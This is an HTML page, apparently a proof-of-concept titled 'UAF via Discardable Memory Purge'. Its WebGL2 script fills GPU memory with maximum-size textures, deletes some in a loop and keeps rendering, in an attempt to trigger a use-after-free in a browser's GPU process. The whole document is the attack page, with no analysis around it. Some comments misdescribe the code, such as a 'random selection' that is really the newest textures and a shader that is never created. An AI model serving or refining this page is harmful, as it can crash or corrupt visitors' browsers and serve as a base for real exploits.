<!DOCTYPE html>
<html>
<body>
<h1>UAF via Discardable Memory Purge</h1>
<canvas id="c" width="256" height="256"></canvas>
<script>
const canvas = document.getElementById('c');
const gl = canvas.getContext('webgl2', {
  powerPreference: 'high-performance',
  preserveDrawingBuffer: true
});
if (!gl) throw new Error('WebGL2 not supported');

const maxSize = gl.getParameter(gl.MAX_TEXTURE_SIZE);
const texSize = maxSize; // use the max to fill memory fast

// Array to hold many large textures
const textures = [];

function allocate() {
  for (let i = 0; i < 10; i++) {
    const tex = gl.createTexture();
    gl.bindTexture(gl.TEXTURE_2D, tex);
    gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, texSize, texSize, 0, gl.RGBA, gl.UNSIGNED_BYTE, null);
    textures.push(tex);
  }
}

function freeSome() {
  // Delete a random selection to create holes
  for (let i = textures.length - 1; i >= 0 && i >= textures.length - 20; i--) {
    const tex = textures.pop();
    gl.deleteTexture(tex);
  }
}

function forceRender() {
  gl.clear(gl.COLOR_BUFFER_BIT);
  // Use a small shader to keep the GPU pipeline busy
  // This forces the GPU process to access texture memory
  const pixel = new Uint8Array(4);
  gl.readPixels(0, 0, 1, 1, gl.RGBA, gl.UNSIGNED_BYTE, pixel);
  requestAnimationFrame(forceRender);
}

// Start continuous rendering
requestAnimationFrame(forceRender);

// Every 100ms, allocate and free to stress the discardable manager
setInterval(() => {
  allocate();
  freeSome();
  console.log('Textures count:', textures.length);
}, 100);
</script>
</body>
</html>
